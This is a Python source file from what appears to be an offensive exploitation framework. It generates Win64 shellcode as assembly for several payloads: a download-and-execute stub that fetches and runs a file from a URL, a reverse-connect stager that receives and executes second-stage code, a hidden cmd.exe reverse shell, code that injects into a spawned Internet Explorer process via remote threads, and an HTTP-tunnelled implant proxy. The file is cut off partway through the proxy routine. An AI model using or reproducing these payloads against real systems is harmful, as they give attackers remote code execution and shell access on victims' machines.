#! /usr/bin/env python

# a payload generator for win64

from basecode64 import basecode
from basecode64 import s_to_push
from MOSDEF import mosdef
from MOSDEF import pelib
from exploitutils import *
import struct
import socket
import random
import time

import canvasengine
import logging

from engine import CanvasConfig

USAGE = """
"""

class payloads:
    def __init__(self, VirtualProtect=True, ActivationContext=False, module=None, dll=False, dll_create_thread=True, use_mutex=False):
        self.vprotect    = VirtualProtect
        self.vactivation = ActivationContext
        self.module      = module
        self.dll         = dll
        self.use_mutex = True

    def get_basecode(self, **args):
        if self.vprotect: args['VirtualProtect'] = True
        if self.vactivation: args['ActivationContext'] = True
        if self.dll: args['dll'] = True
        if self.use_mutex: args['use_mutex'] = True
        return basecode( **args )

    def assemble(self, code):
        """ just a little convenience callthrough to mosdef.assemble """
        return mosdef.assemble(code, 'x64')


    def msgbox(self, message, title):
        """
        MsgBox
          This shellcode will display a message box with the supplied message
          and title
        """

        codegen = self.get_basecode()
        codegen.find_function("user32.dll!MessageBoxA")
        codegen._globals.addString("MESSAGE", message)
        codegen._globals.addString("TITLE", message)

        codegen.main = """

        xorl %eax, %eax
        mov $0x208, %edx
        //movl %ecx, %edx
        sub %edx, %esp
        movl  %esp, %esi

        xor %rcx, %rcx			    // arg1: hWnd = Desktop
        leal MESSAGE-getpcloc(%rbp),%rdx    // arg2: message
        leal TITLE-getpcloc(%rbp),%r8       // arg3: title
        xor %r9,%r9			    // arg4: uType = MB_OK

        call MESSAGEBOXA-getpcloc(%rbp)     // Call MessageBoxA

        """

        return codegen.get()



    def httpcachedownload(self, urlfile, isBatch = False, usedll = 0):
        """
        Http Cache Download
          This shellcode will automatically download a file into the IE cache and execute it.
          Depending on what you program you are executing, you might need to append "cmd /c" at the begging,
          to do that just enable isBatch
          Note: Right now this doesn't work with CANVAS httpuploader due to incompatibilities issue.
          dave - like what? Let's fix those.
        """

        codegen = self.get_basecode()
        codegen.find_function("kernel32.dll!loadlibrarya")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!terminatethread")
        codegen.find_function("kernel32.dll!getcurrentthread")
        codegen.load_library('urlmon.dll')
        codegen.find_function("urlmon.dll!urldownloadtocachefilea")
        codegen._globals.addString("URLNAME", urlfile)

        codegen.main = """


        // 16 byte stack alignment
        xor %rbx, %rbx
        sub $0x10, %rbx
        and %rbx, %rsp


        xor %rax, %rax

        mov $0x208, %rdi
        sub %rdi, %rsp
        mov  %rsp, %rsi



        push %rsi   //we pop this back into esi at some point


        // set up UrlDownloadToCacheFile parameters
        push %rax                           // arg6: pBSC
        push %rax                           // arg5: dwReserved
        mov %rdi, %r9                       // arg4: dwBufLength
        mov %rsi, %r8                       // arg3: szFileName
        leal URLNAME-getpcloc(%rbp),%rdx    // arg2: URL
        xor %rcx,%rcx                       // arg1: lpUnkCaller

        sub $0x20, %rsp			    // Shadow space

        call URLDOWNLOADTOCACHEFILEA-getpcloc(%rbp) // HFILE handle
        //we do not check for error here! (for size reasons)

        add $0x20, %rsp
        pop %rsi
        pop %rsi
        pop %rsi  // get the file back
        //rsi points to the filename now

        """

        if usedll == 1:
            codegen.main += """
            mov %rsi,%rcx
            sub $0x20,%rsp
            call LOADLIBRARYA-getpcloc(%rbp)
            add $0x20,%rsp
            """
        else:
            codegen.main += """
            xor %rax, %rax
            mov  $0x100, %rcx
            sub  %rcx, %rsp
            mov %rsp, %rdi // CLEAR the buffer
            rep stosb

            leal 16(%rsp), %rcx
            leal 84(%rsp), %rdx
            mov $0x1, 0x2c(%rdx)

            push %rax       // Alignment


            // Call CreateProcessA

            push %rcx       // PROCESS INFORMATION
            push %rdx       // STARTUP INFO
            push %rax       // lpCurrentDirectory
            push %rax       // lpEnvironment
            push %rax       // Creation Flag
            push %rax       // bInheritHandles
            xor %r9,%r9     // lpThreadAttributes
            xor %r8,%r8     // lpProcessAttributes
            xor %rdx,%rdx   //command line (null - we have spaces and no need to quote if we use file name instaed)
            mov %rsi,%rcx   // (file name - will have spaces in it)
            sub $0x20, %rsp			    // Shadow space

            call CREATEPROCESSA-getpcloc(%rbp)
            """

        codegen.main += """
        // do we need to take into account shadow space here?
        call GETCURRENTTHREAD-getpcloc(%rbp)

        mov %rax,%rcx	//current thread
        xor %rdx,%rdx	// exit code

        call TERMINATETHREAD-getpcloc(%rbp)

        """

        return codegen.get()


    # Simple callback & execute
    #
    def callback(self, host, port, load_winsock=True, universal=False, close_socket=None, exit_process=False):
        """ generate a standalone callback payload .. example! """

        codegen = self.get_basecode()
        codegen.find_function('kernel32.dll!loadlibrarya')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!virtualfree')
        codegen.find_function('kernel32.dll!getcurrentthread')
        codegen.find_function('kernel32.dll!terminatethread')
        codegen.find_function('kernel32.dll!exitthread')

        if load_winsock == True:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('ws2_32.dll!wsastartup')

        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!recv')
        codegen.find_function('ws2_32.dll!wsagetlasterror')
        
        if CanvasConfig["ensure_disconnect_shellcode"] or close_socket:
            codegen.find_function('ws2_32.dll!closesocket')

        if universal == True:
            codegen.find_function('ws2_32.dll!send')

        # enable the debug stub
        codegen.enable_debug()


        if load_winsock == True:
            # wsastartup
            codegen.main += """

            and $0xfffffff0,%rsp
            subl $0x200,%rsp

            xorl %rcx,%rcx  // arg1: wVersionRequested = 1.1
            movb $0x1,%ch   //
            movb $0x1,%cl   //
            mov %rsp,%rdx  // arg2: lpWSAData

            sub $0x20,%rsp  // shadow space
            call *WSASTARTUP-getpcloc(%rbp)
            add $0x220,%rsp // mosdef still has that issue with 0x100/256 sized addl's!
            """

        codegen._globals.addQword('FDSPOT')
        codegen.main += """
        and $0xfffffff0,%rsp

        // Create socket
        mov $0x2,%rcx      // arg1: af = 0x2 (AF_INET)
        mov $0x1,%rdx      // arg2: type = 0x1 (SOCK_STREAM)
        mov $0x6,%r8       // arg3: proto = 0x6 (tcp)
        sub $0x20,%rsp    // shadow space
        cld
        call *SOCKET-getpcloc(%rbp)
        add $0x20,%rsp

        mov %rax,FDSPOT-getpcloc(%rbp)  // saves socket fd

        // sockaddr structure
        xorl %rbx,%rbx
        push %rbx
        movq $REPLACEHOSTANDPORT,%rbx
        push %rbx

        //Connect
        mov %rax,%rcx      // arg1: socket
        mov %rsp,%rdx      // arg2: sockaddr *name
        and $0xfffffff0,%rsp
        mov $0x10, %r8     // arg3: namelen
        sub $0x20,%rsp     // shadow space
        call *CONNECT-getpcloc(%rbp)
        add $0x20,%rsp

        // ERROR CHECK ? Yes, it is needed!
        // Without a check here, the 1st send can loop forever, eating up CPU cycles.
        test %eax, %eax
        jnz exit

        """
        a = istr2int(socket.inet_aton(host))
        b = reverseword((0x02000000 | port))
        host_and_port = "0x%08x%08x" %  (uint_bits(32, a),uint_bits(32,b))
        codegen.main = codegen.main.replace('REPLACEHOSTANDPORT', \
                                            host_and_port)

        if universal == True:

            if (self.module
                and hasattr(self.module, 'engine') == True
                and self.module.engine):

                mosdef_type = self.module.engine.getMosdefType(canvasengine.WIN64MOSDEF_INTEL)
                mosdef_id = self.module.engine.getNewMosdefID(self.module)

            else:
                mosdef_type = 2
                mosdef_id = 0

            logging.info('Using Win64 Universal, type: %d, id: %d' % (mosdef_type, mosdef_id))

            codegen.main += """

            movq $0x%08x%08x,%%rbx // type and ID
            push %%rbx

            mov $8,%%rcx
            mov %%rsp,%%rdx
            call sendloop

            pop %%rbx

	    """ % (socket.htonl(mosdef_id), socket.htonl(mosdef_type))


        # Recv & Exec
        codegen.main +="""

        win64RecvExecCode:

            // receive len (4 bytes)
            push %rax                       // recv space
            mov $4,%rcx                     // arg1: length
            mov %rsp,%rdx                   // arg2: buffer
            call recvloop

        gogotlen:

            xor %rax,%rax
            movl (%rsp),%eax
            mov %rax,%rdi                   // rdi will hold len
            pop %rax                        // eat recv buf to prevent alloca leak

            // Allocate buffer space (DEP Safe)
            xor %rcx,%rcx                   // arg1: lpAddress = Null
            mov %rdi, %rdx                  // arg2: dwSize
            mov $0x1000, %r8                // arg3: flAllocationType = MEM_COMMIT
            mov $0x40, %r9                  // arg4: flProtect = PAGE_EXECUTE_READWRITE

            call *VIRTUALALLOC-getpcloc(%rbp)

            // XXX: error check needed

            push %rax                       // save ptr for us to jmp to later on

        recvexec:

            mov %rdi,%rcx
            mov %rax,%rdx
            call recvloop

        stagetwo:

            pop %rax                        // restore pointer

            mov FDSPOT-getpcloc(%rbp),%r15  // 2nd stage expects socket in r15
            call *%rax                      // _CALL_ ... mosdef returns to here

            // free the memory !
            mov %rax, %rcx                  // arg1: lpAddress
            xor %rdx, %rdx                  // arg2: dwSize = 0
            mov $0x8000, %r8                // arg3: fwFreeType = MEM_RELEASE

            call *VIRTUALFREE-getpcloc(%rbp)

            // XXX: error check needed

            jmp win64RecvExecCode           // loop again

        exit:
            SOCKET_CLOSE_STUB
            call *GETCURRENTTHREAD-getpcloc(%rbp)

            mov %rax,%rcx
            xor %rdx,%rdx

            call *EXIT_FUNCTION-getpcloc(%rbp)

        """

        exit_function = "TerminateThread"
        if exit_process:
            exit_function = "ExitProcess"

        codegen.find_function("kernel32.dll!%s" % exit_function)
        codegen.main = codegen.main.replace("EXIT_FUNCTION", exit_function.upper())


        close_stub = ""
        if CanvasConfig["ensure_disconnect_shellcode"] or close_socket:
            close_stub = """and $0xfffffff0,%rsp
                            mov FDSPOT-getpcloc(%rbp),%rcx
                            sub $0x20, %rsp
                            call *CLOSESOCKET-getpcloc(%rbp)
                            add $0x20, %rsp
                         """
        
        codegen.main = codegen.main.replace("SOCKET_CLOSE_STUB", close_stub)

        # sendloop function
        # args:
        #   rcx: length
        #   rdx: buffer
        codegen.main +="""
            sendloop:

                mov %rsp,%r15
                and $0xfffffff0,%rsp            // ensure 16 byte align

                mov %rcx,%rsi                   // length
                mov %rdx,%rdi                   // buffer

            sendloop_one:

                xor %r9,%r9                     // arg4: flags  (0x0)
                mov %rsi,%r8                    // arg3: len
                mov %rdi,%rdx                   // XXX: buffer pointer wasnt getting updated
                mov FDSPOT-getpcloc(%rbp),%rcx  // arg1: socket

                sub $0x20, %rsp                 // shadow space
                call *SEND-getpcloc(%rbp)
                add $0x20, %rsp                 // eat shadow space

                cmp $0,%rax
                jg no_send_error

                call *WSAGETLASTERROR-getpcloc(%rbp)
                cmp $10004, %rax     // WSAEINTR
                jz sendloop_one
                cmp $10035, %rax     // WSAEWOULDBLOCK
                jz sendloop_one

                jmp exit

            no_send_error:

                sub %rax,%rsi                   // subtract length we sent
                add %rax,%rdi                   // increment the buffer pointer

                test %rsi,%rsi                  // are we done?
                jne sendloop_one                // continue receiving

                mov %r15,%rsp
                ret
        """

        # recvloop function
        # args:
        #   rcx: length
        #   rdx: buffer
        codegen.main += """
            recvloop:

                mov %rsp,%r15
                and $0xfffffff0,%rsp

                mov %rcx,%rsi
                mov %rdx,%rdi

            recvloop_one:

                xor %r9,%r9
                mov %rsi,%r8
                mov %rdi,%rdx
                mov FDSPOT-getpcloc(%rbp),%rcx
                sub $0x20,%rsp
                call *RECV-getpcloc(%rbp)
                add $0x20,%rsp

                cmp $0,%rax
                jg no_recv_error

                call *WSAGETLASTERROR-getpcloc(%rbp)
                cmp $10004,%rax     // WSAEINTR
                jz recvloop_one
                cmp $10035,%rax     // WSAEWOULDBLOCK
                jz recvloop_one

                jmp exit

            no_recv_error:

                sub %rax,%rsi
                add %rax,%rdi

                test %rsi,%rsi
                jne recvloop_one

                mov %r15,%rsp
                ret
        """

        return codegen.get()


    def cmdcallback(self, host, port, load_winsock=True):
        """ generates a cmd.exe standalone callback payload """

        codegen = self.get_basecode()
        codegen.find_function('kernel32.dll!loadlibrarya')
        if load_winsock == True:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('ws2_32.dll!wsastartup')
        codegen.find_function('ws2_32.dll!wsasocketa')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!terminatethread")
        codegen.find_function("kernel32.dll!getcurrentthread")
        codegen._globals.addString("CMD", "cmd")

        # enable the debug stub
        codegen.enable_debug()

        if load_winsock == True:
            # wsastartup
            codegen.main += """

            subl $0x200,%rsp

            xorl %rcx,%rcx                    // arg1: wVersionRequested = 1.1
            movb $0x1,%ch                     //
            movb $0x1,%cl                     //
            mov %rsp, %rdx                    // arg2: lpWSAData
            sub $0x20,%rsp                    // shadow space
            call *WSASTARTUP-getpcloc(%rbp)
            addl $0x200,%rsp
            """

        codegen._globals.addDword('FDSPOT')
        codegen.main += """

		// Create socket
		mov $0x2,%rcx                         // arg1: af = 0x2 (AF_INET)
		mov $0x1,%rdx                         // arg2: type = 0x1 (SOCK_STREAM)
		mov $0x6,%r8                          // arg3: proto = 0x6 (tcp)
		xor %r9,%r9                           // arg4: lpProtocolInfo = NULL
		xor %rcx,%rcx
		push %rcx                             // arg5: group = NULL
		push %rcx                             // arg6: dwFlags = NULL
		sub $0x20, %esp                       // shadow space
		cld                                   // ??
		call *WSASOCKETA-getpcloc(%rbp)


		movl %eax,FDSPOT-getpcloc(%rbp)       // saves socket fd

		// sockaddr structure
		xorl %rbx,%rbx
		push %rbx
		movq $REPLACEHOSTANDPORT,%rbx
		push %rbx

		//Connect
		mov %rax,%rcx                         // arg1: socket
		mov %rsp,%rdx                         // arg2: sockaddr *name
		mov $0x10, %r8                        // arg3: namelen
		sub $0x20,%rsp                        // shadow space
		call *CONNECT-getpcloc(%rbp)

		//jnz exit // TODO

        """
        a = istr2int(socket.inet_aton(host))
        b = reverseword((0x02000000 | port))
        host_and_port = "0x%08x%08x" %  (uint_bits(32, a),uint_bits(32,b))
        codegen.main = codegen.main.replace('REPLACEHOSTANDPORT', \
                                            host_and_port)

        codegen.main +="""

		// Prepare buffers
		xor %rax, %rax
		mov  $0x100, %rcx
		sub  %rcx, %rsp
		mov %rsp, %rdi                        // Clear the buffer
		rep stosb

		leal (%rsp),%rcx                      // ProcessInfo Buffer
		leal 0x18(%rsp),%rdx                  // StartupInfo Buffer

        mov FDSPOT-getpcloc(%rbp),%eax        // get socket

		// Fill StartupInfo structure
		movb $0x68, 0x0(%rdx)                 // cb

		incl 0x3D(%rdx)                       // sdwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
		incl 0x3C(%rdx)                       //
		incl 0x4C(%rdx)                       // wShowWindow = SW_HIDE
		mov %rax, 0x50(%rdx)                  // hStdInput
		mov %rax, 0x58(%rdx)                  // hStdOutput
		mov %rax, 0x60(%rdx)                  // Err

		// Call CreateProcessA
		xor %rax,%rax
		push %rcx                             // arg10:PROCESS INFORMATION
		push %rdx                             // arg9: STARTUP INFO
		push %rax                             // arg8: lpCurrentDirectory = NULL
		push %rax                             // arg7: lpEnvironment = NULL
		push %rax                             // arg6: Creation Flag = 0
		inc %rax
		push %rax                             // arg5: bInheritHandles = True
		xor %r9,%r9                           // arg4: lpThreadAttributes
		xor %r8,%r8                           // arg3: lpProcessAttributes
        leal CMD-getpcloc(%rbp),%rdx          // arg2: command line = "cmd"
		xor %rcx,%rcx                         // arg1: fileName = NULL
		sub $0x20,%rsp                        // shadow space

		call CREATEPROCESSA-getpcloc(%rbp)

		//TODO: check this

		// do we need to take into account shadow space here?
		call GETCURRENTTHREAD-getpcloc(%rbp)

		mov %rax,%rcx	//current thread
		xor %rdx,%rdx	// exit code

		call TERMINATETHREAD-getpcloc(%rbp)

        """

        return codegen.get()


    def InjectToSelf(self, host, port, heading = '', ending = ''):

        codegen = self.get_basecode()
        codegen.find_function("kernel32.dll!GetEnvironmentVariableA")
        codegen.find_function("kernel32.dll!CreateProcessA")
        codegen.find_function("kernel32.dll!VirtualAllocEx")
        codegen.find_function("kernel32.dll!WriteProcessMemory")
        codegen.find_function("kernel32.dll!CreateRemoteThread")
        codegen.find_function("kernel32.dll!ExitProcess")
        codegen._globals.addString("PROGRAMFILES", "PROGRAMFILES")

        codegen.insertHeadingCode(heading)
        codegen.insertEndingCode(ending)

        codegen.main = """
        xor %rax, %rax
        mov $0xf0, %rcx
        sub %rcx, %rsp
        mov %rsp, %rdi                        // CLEAR the buffer
        rep stosb

        leal PROGRAMFILES-getpcloc(%rbp),%rcx // arg1 name
        leal (%rsp), %rdx                     // arg2 buffer
        mov $0xf0, %r8                        // arg3 size
        sub $0x20, %rsp			      // Shadow  space
        mov %rdx,%rbx                         //  move buffer to non-volatile reg.

        call GETENVIRONMENTVARIABLEA-getpcloc(%rbp)

        mov %rbx,%r12

    end_string:
        incl %rbx
        movb (%rbx),%al
        test %rax,%rax
        jnz end_string

        mov %rbx, %rsp                   // C:\Program Files
        movb $0x20, %al
        add %rax, %rsp

        movq $0x006578652E65726F, %rax
        movq $0x6C707865695C7265, %rdi
        movq $0x726F6C7078452074, %rcx
        movq $0x656E7265746E495C, %rdx
        push %rax
        push %rdi
        push %rcx
        push %rdx

        sub $0x70, %rsp

        xor %rcx,%rcx
        xor %rax,%rax
        movb $20,%cl


    si_struct_clear:
        push %rax
        loop si_struct_clear
        mov %rsp, %rsi

        // +4 to save inject mem
        movb $6,%cl

    pi_struct_clear:
        push %rax
        loop pi_struct_clear
        mov %rsp,%rdi

    //set STARTF_USESHOWWINDOW and .cb
        movl $68,(%rsi)
        incl 44(%rsi)

    // Call CreateProcessA

        push %rdi       // PROCESS INFORMATION
        push %rsi       // STARTUP INFO
        push %rax       // lpCurrentDirectory
        push %rax       // lpEnvironment
        mov $12, %cl               // CREATE_SUSPENDED
        push %rcx       // Creation Flag
        push %rax       // bInheritHandles
        xor %r9,%r9     // lpThreadAttributes
        xor %r8,%r8     // lpProcessAttributes
        mov %r12,%rdx   // command line (null - we have spaces and no need to quote if we use file name instaed)
        mov %rax,%rcx   // (file name - will have spaces in it)

        sub $0x20, %rsp	// Shadow space
        call CREATEPROCESSA-getpcloc(%rbp)
        test %rax,%rax
        //jz exit_mark


        xor %rax,%rax
        movb $0x40,%al
        push %rax           // Memory Protection

        xor %r9,%r9
        mov $0x1000,%r9    // Alloc Type
        mov $0x1000, %r8  // Size mod.
        xor %rax,%rax
        mov %rax, %rdx    // null
        mov (%rdi),%rcx   // pi.hProcess has process handle
        sub $0x20, %rsp 	// Shadow space

        call VIRTUALALLOCEX-getpcloc(%rbp)

        // save inject mem
        mov %rax,16(%rdi)

        xor %rcx,%rcx
        push %rcx
        mov $CODESIZE, %r9                     // size
        leal codemark-getpcloc(%rbp),%r8    // buffer
        mov %rax,%rdx                      // address
        mov (%rdi),%rcx                    // hProcess
        sub $0x20, %rsp 	        // Shadow space


        call WRITEPROCESSMEMORY-getpcloc(%rbp)

        xor %rax,%rax
        push %rax
        push %rax
        push %rax
        mov 16(%rdi), %r9
        xor %r8,%r8
        mov %rax,%rdx
        mov (%rdi),%rcx                   // hProcess
        sub $0x20, %rsp 	        // Shadow space

        call CREATEREMOTETHREAD-getpcloc(%rbp)

    """

# Example:

        from shellcode.standalone.windows import payloads64
        p1 = payloads64.payloads(module=self.module)
        var = p1.callback(host,port, universal=True)
        bin = p1.assemble(var)

        size = hex(len(bin))
        codegen.main = codegen.main.replace('CODESIZE', \
                                            size)

        codegen._globals.addString('codemark',bin)
        return codegen.get()

    def wrap_payload(self, code_bytes):
        codegen = self.get_basecode()
        codegen.enable_debug()
        codegen.main += "wrapped_payload:\n"
        codegen.main += "\n".join([".byte 0x%02x" % ord(code_byte) for code_byte in code_bytes])
        codegen.main += "\nend_wrapped_payload:\nint3\n"
        
        return codegen.get()

    def http_proxy(self, host, port, load_winsock=True, SSL=False):
        """
        A HTTP -> TCP MOSDEF proxy payload
        """

        codegen = self.get_basecode()

        # enable the debug stub
        codegen.enable_debug()

        # ws2_32.dll
        codegen.find_function('kernel32.dll!loadlibrarya')

        if load_winsock == True:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('ws2_32.dll!wsastartup')

        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!bind')
        codegen.find_function('ws2_32.dll!listen')
        codegen.find_function('ws2_32.dll!accept')
        codegen.find_function('ws2_32.dll!send')
        codegen.find_function('ws2_32.dll!recv')
        codegen.find_function('ws2_32.dll!select')
        codegen.find_function('ws2_32.dll!CloseSocket')
        codegen.find_function('ws2_32.dll!WSASocketA')

        # wininet.dll
        codegen.load_library('wininet.dll')
        codegen.find_function('wininet.dll!InternetOpenA')
        codegen.find_function('wininet.dll!InternetOpenUrlA')
        codegen.find_function('wininet.dll!InternetReadFile')
        codegen.find_function('wininet.dll!InternetCloseHandle')
        codegen.find_function('wininet.dll!InternetConnectA')
        codegen.find_function('wininet.dll!HttpSendRequestA')
        codegen.find_function('wininet.dll!HttpAddRequestHeadersA')
        codegen.find_function('wininet.dll!HttpOpenRequestA')
        codegen.find_function('wininet.dll!InternetSetOptionA')
        codegen.find_function('wininet.dll!HttpQueryInfoA')
        codegen.find_function('wininet.dll!HttpSendRequestA')

        # kernel32.dll
        codegen.find_function('kernel32.dll!CreateThread')
        codegen.find_function('kernel32.dll!GetExitCodeThread')
        codegen.find_function('kernel32.dll!ExitThread')
        codegen.find_function('kernel32.dll!VirtualAlloc')
        codegen.find_function('kernel32.dll!VirtualFree')
        codegen.find_function('kernel32.dll!TerminateThread')
        codegen.find_function('kernel32.dll!ResumeThread')
        codegen.find_function('kernel32.dll!DisableThreadLibraryCalls')

        # XXX: if we have a defined engine, query it for the index id and payload id
        if self.module and hasattr(self.module, 'engine') == True and self.module.engine:
            mosdef_type = self.module.engine.getMosdefType(canvasengine.WIN64MOSDEF_INTEL)
            mosdef_id = self.module.engine.getNewMosdefID(self.module)
            x_id = '0x%.8x,0x%.8x' % (mosdef_type, mosdef_id)
        else:
            x_id = '0x%.8x,0x%.8x' % (2, time.time()) # win64 mosdef is index 2 for mosdef type


        # size is not so much of an issue with clientside payloads ...
        codegen._globals.addString('MODE_PUSH_MORE', \
                                   'X-mode: push\r\nX-type: more\r\nX-id: %s\r\n' % x_id)
        codegen._globals.addString('MODE_PUSH_LAST', \
                                   'X-mode: push\r\nX-type: last\r\nX-id: %s\r\n' % x_id)
        codegen._globals.addString('MODE_POP', \
                                   'X-mode: pop\r\n\r\nX-id: %s\r\n' % x_id)

        # wininet control data
        codegen._globals.addString('MOZILLA', 'Mozilla')
        codegen._globals.addString('CLIENTID', '/') # XXX: old terminology not clientid
        codegen._globals.addString('POST', 'POST')
        codegen._globals.addQword('HTTPPORT', val = port)
        codegen._globals.addString('HTTPHOST', host)

        if load_winsock == True:
            # wsastartup
            codegen.main += """
            subl $0x200,%rsp
            push %rsp
            pop  %rdx
            xor  %rcx,%rcx
            movb $0x1,%ch
            movb $0x1,%cl
            sub  $0x20,%rsp
            call *WSASTARTUP-getpcloc(%rbp)
            addl $0x220,%rsp
            """
        codegen._globals.addQword('FDSPOT_BIND')
        codegen._globals.addQword('FDSPOT_CNCT')
        codegen._globals.addQword('MOSDEF_PAGE')
        codegen._globals.addQword('HTTPHANDLE')
        codegen._globals.addQword('HCONNECT')
        codegen._globals.addQword('HREQUEST')
        codegen._globals.addQword('MYBUFFER_SIZE')
        codegen._globals.addQword('MYBUFFER')
        codegen._globals.addQword('MOSDEFHANDLE')

        #typedef struct fd_set {
        #   u_int  fd_count;
        #   SOCKET fd_array[FD_SETSIZE];
        #} fd_set;

        codegen.main += """
        // launch mosdef thread
        //lpThreadAtt
        xor  %rcx,%rcx
        //dwStackSize
        xor  %rdx,%rdx
        //lpStartAddress
        lea   bind_mosdef-getpcloc(%rbp),%r8
        //lpParameter
        mov  %rbp,%r9
        //dwCreationFlags
        push %rcx
        //lpThreadId
        push %rcx
        sub  $0x20,%rsp
        call *CREATETHREAD-getpcloc(%rbp)
        add  $0x20,%rsp
        mov %rax,MOSDEFHANDLE-getpcloc(%rbp)     // Save thread handle
        pop %rcx
        pop %rcx
        """

        if self.dll:
            codegen.main += """
            ret
            """
        else:
            codegen.main += """
            xor %rdx, %rdx
            mov $0xfffffffffffffffe, %rcx
            sub $0x20, %rsp
            call *TERMINATETHREAD-getpcloc(%rbp)
            """

        codegen.main += """
        // connect to bound localhost mosdef
        connect_mosdef:
        nop
        and $0xfffffff0,%rsp
        mov   %rcx, %rbp
        xor   %rcx,%rcx
        xor   %rdx,%rdx
        movw  $0x2,%cx
        movw  $0x1,%dx
        xor   %r8,%r8
        movw  $0x6,%r8w
        sub   $0x20,%rsp
        cld
        call *SOCKET-getpcloc(%rbp)
        mov  %rax,FDSPOT_CNCT-getpcloc(%rbp) //save socket

        add  $0x20,%rsp

        //rax has the socket
        mov  %rax,%rcx
        //sockaddr
        xor  %rbx,%rbx
        push %rbx
        movq $REPLACEHOSTANDPORT,%rbx
        push %rbx
        mov  %rsp,%rdx
        //namelen
        mov  $0x10,%r8

        sub  $0x20,%rsp

        call *CONNECT-getpcloc(%rbp)

        add  $0x30,%rsp

        cmpl $-1,%eax
        je exit_mosdef

        // alloc mosdef pages
        xor %rcx,%rcx
        mov $0x10000,%rdx
        mov $0x1000,%r8
        mov $0x40,%r9
        sub $0x20,%rsp
        call *VIRTUALALLOC-getpcloc(%rbp)
        add $0x20,%rsp

        mov %rax,MOSDEF_PAGE-getpcloc(%rbp)

        // main HTTP handle (do not loop only need 1 instance)
        lea  MOZILLA-getpcloc(%rbp),%rcx
        xor  %rdx,%rdx
        xor  %r8,%r8
        xor  %r9,%r9

        //push 0 for dwflags
        push %r8
        push %r8

        sub  $0x20,%rsp

        call *INTERNETOPENA-getpcloc(%rbp)

        add  $0x30,%rsp

        mov  %rax,HTTPHANDLE-getpcloc(%rbp)

        // this loops until exit
        select_mosdef_and_http:

        // Check if mosdef thread is still alive
        push %rax
        mov %rsp, %rdx
        mov MOSDEFHANDLE-getpcloc(%ebp), %rcx
        sub $0x28,%rsp
        call *GETEXITCODETHREAD-getpcloc(%rbp)
        add $0x28,%rsp
        pop %rax
        cmp $259,%rax
        jne exit

        // init HCONNECT/HREQUEST handles
        //64
        //HINTERNET, from rax
        mov  HTTPHANDLE-getpcloc(%rbp),%rcx
        //lpszServerName
        lea  HTTPHOST-getpcloc(%rbp),%rdx
        //nServerPort
        mov  HTTPPORT-getpcloc(%rbp),%r8
        //lpszUsername
        xor  %r9,%r9
        //dwContext
        push %r9
        //dwFlags
        push %r9
        //dwService
        mov  $0x3,%rax
        push %rax
        //lpszPassword  = 0
        push %r9
        sub  $0x20,%rsp
        call *INTERNETCONNECTA-getpcloc(%rbp)
        mov  %rax,HCONNECT-getpcloc(%rbp)

        add  $0x40,%rsp

        //We have the handler in rax
        mov %rax,%rcx
        lea POST-getpcloc(%rbp),%rdx
        lea CLIENTID-getpcloc(%rbp),%r8
        xor %r9,%r9
        push %r9
        mov $FLAGS,%rsi
        push %rsi
        push %r9
        push %r9

        sub $0x20,%rsp

        call *HTTPOPENREQUESTA-getpcloc(%rbp)

        add $0x40,%rsp

        mov %rax,HREQUEST-getpcloc(%rbp)


        push %rsp

        mov HREQUEST-getpcloc(%rbp),%rcx
        mov $31,%rdx
        push $0x00003380
        mov %rsp,%r8
        mov $4,%r9

        sub $0x20,%rsp

        call *INTERNETSETOPTIONA-getpcloc(%rbp)

        add $0x30,%rsp

        push %rsp //align stack

        // nfds ignored
        xor %rcx,%rcx
        // build select array (fd_set readfds)
        mov FDSPOT_CNCT-getpcloc(%rbp),%rax
        push %rax
        mov $1,%rax
        push %rax
        mov  %rsp,%rdx
        // writefds and exceptfds null
        xor %r8,%r8
        xor %r9,%r9
        // build TIMEVAL (this is strange!, really!)
        mov $TIMEOUT_USECS,%rax
        push %rax
        mov $TIMEOUT_SECS,%eax
        push %rax
        mov  %rsp,%rax
        push %rax

        sub $0x20,%rsp

        call *SELECT-getpcloc(%rbp)

        add $0x50,%rsp

        cmp $1,%rax

        je mosdef_recv

        // think of this as a select on the HTTP end
        http_pop:

        push %rsp //align

        mov HREQUEST-getpcloc(%rbp),%rcx //handler
        lea MODE_POP-getpcloc(%rbp),%rdx // header data
        mov $-1,%r8 //header length
        xor %r9,%r9 //body data
        push %r9   //body size

        sub $0x20,%rsp

        call *HTTPSENDREQUESTA-getpcloc(%rbp)

        add $0x30,%rsp

        test %rax,%rax
        jz exit

        push %rsp //align

        mov HREQUEST-getpcloc(%rbp),%rcx //hrequest
        xor %rdx,%rdx
        mov $0x20000005,%edx // HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH
        // lpvBuffer
        lea MYBUFFER-getpcloc(%rbp),%r8
        // lpdwBufferLength
        mov $8,MYBUFFER_SIZE-getpcloc(%rbp)
        lea MYBUFFER_SIZE-getpcloc(%rbp),%r9
        // lpdwIndex
        xor %rax,%rax
        push %rax

        sub $0x20,%rsp

        call *HTTPQUERYINFOA-getpcloc(%rbp)

        add $0x30,%rsp

        xor %r14,%r14
        mov MYBUFFER-getpcloc(%rbp),%r14d //save buffer received
        xor %rbx,%rbx // start offset at 0

        readfile:

        push %rsp //align

        // hFile
        mov HREQUEST-getpcloc(%rbp),%rcx
        // lpBuffer
        mov MOSDEF_PAGE-getpcloc(%rbp),%rdi
        add %rbx,%rdi //add offset
        mov %rdi,%rdx
        // dwNumberOfBytesRead
        mov %r14,%r8
        // lpdwNumberOfBytesRead
        push %r8
        mov %rsp,%r9
        mov %rsp,%r12 // the function will destroy r9 so save in r12 too

        sub $0x20,%rsp

        call *INTERNETREADFILE-getpcloc(%rbp)

        mov (%r12),%r13 // received bytes

        add $0x30,%rsp

        test %rax,%rax

        jnz readfile_done

        //r13 content length
        //rbx offset in page
        //r14 length remaining
        sub %r13,%r14 // adjust count with received bytes
